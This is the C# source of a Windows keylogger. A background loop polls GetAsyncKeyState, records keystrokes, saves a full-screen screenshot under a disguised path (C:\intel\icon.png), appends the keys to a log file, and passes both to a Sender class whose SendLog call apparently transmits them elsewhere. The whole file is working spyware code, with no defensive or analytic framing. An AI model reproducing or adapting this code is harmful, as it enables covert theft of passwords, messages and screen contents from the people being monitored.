using System;
using System.ComponentModel;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using System.Drawing;
using System.Drawing.Imaging;

namespace OperLog
{
    class Log
    {
        public static int nsymb = 20;
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        //[STAThread]
        BackgroundWorker _bw;
        public void Main() {
            this._bw = new BackgroundWorker();
            this._bw.DoWork += Key_Log;
            this._bw.RunWorkerAsync();
        }
        const string picpath = @"C:\intel\icon.png";
        const string logpath = @"C:\intel\log.log";
        public void Key_Log(object sender, DoWorkEventArgs e)
        { 
            string buf = "";
           while (true) {
                Thread.Sleep(100);
                for (int i = 0; i < 255; i++) 
                {
                    int state = GetAsyncKeyState(i);
                    if (state != 0)
                    {
                        buf += GetKyesID((Keys)i);
                        if (buf.Length > nsymb) {
                            // TODO: если скрин не получилось сделать возвращать в лог сообщение о неудаче
                            MakeLog(picpath,logpath,buf);
                            buf = "";
                        }
                    }
                }
           }
        }
        static void Snap(string path) {
            try {
                Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                Graphics g = Graphics.FromImage(bmp);
                g.CopyFromScreen(0, 0, Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
                bmp.Save(path, ImageFormat.Png);
            }
            catch (Exception) {
                // Application.Restart(); 
            }
        }

       static void AddText(string text, string path)
        {
            File.AppendAllText(logpath, text);
        }

       static void MakeLog(string picpath, string logpath, string text)
       {
           Snap(picpath);
           AddText(text,logpath);
           Sender m = new Sender();
           m.SendLog(text,picpath);
       }

       static string GetKyesID(Keys keyID)
       {
           string key = "";
           if (keyID == Keys.D0) { key = "0"; return key; }
           if (keyID == Keys.D1) { key = "1"; return key; }
           if (keyID == Keys.D2) { key = "2"; return key; }
           if (keyID == Keys.D3) { key = "3"; return key; }
           if (keyID == Keys.D4) { key = "4"; return key; }
           if (keyID == Keys.D5) { key = "5"; return key; }
           if (keyID == Keys.D6) { key = "6"; return key; }
           if (keyID == Keys.D7) { key = "7"; return key; }
           if (keyID == Keys.D8) { key = "8"; return key; }
           if (keyID == Keys.D9) { key = "9"; return key; }
           if (keyID == Keys.Space) { key = " "; return key;}
           if (keyID == Keys.Escape) { key = "ESC"; return key; }
           if (keyID == Keys.Back) { key = "<-"; return key; }
           if (keyID == Keys.Enter) { key = " NL"; return key; }
           if (keyID == Keys.Capital) { key = "CAPS"; return key; }
           if (keyID == Keys.Tab) { key = "TAB"; return key; }
           if (keyID == Keys.Right || keyID == Keys.Left || keyID == Keys.Down || keyID == Keys.Up) { key = ""; return key; }
           if (keyID == Keys.Menu || keyID == Keys.LMenu || keyID == Keys.RMenu) { key = "ALT"; return key; }
           if (keyID == Keys.Oemplus) { key = "+"; return key; }
           if (keyID == Keys.OemPeriod) { key = "."; return key; }
           if (keyID == Keys.OemMinus) { key = "-"; return key; }
           if (keyID == Keys.Oem5) { key = "/"; return key; }
           if (keyID == Keys.ShiftKey || keyID == Keys.LShiftKey || keyID == Keys.RShiftKey) { key = "SHIFT"; return key; }
           if (keyID == Keys.ControlKey || keyID == Keys.LControlKey || keyID == Keys.RControlKey) { key = "CTRL"; return key; }
           if (keyID == Keys.Oem1) { key = ";"; return key; }
           if (keyID == Keys.LButton || keyID == Keys.RButton || keyID == Keys.MButton) { key = ""; return key; }
           if (keyID.ToString().Length == 1)
           {
               key = keyID.ToString();
           }
           else
           {
               key = $"<{keyID.ToString()}>";
           }
           return key;
       }
    }
}
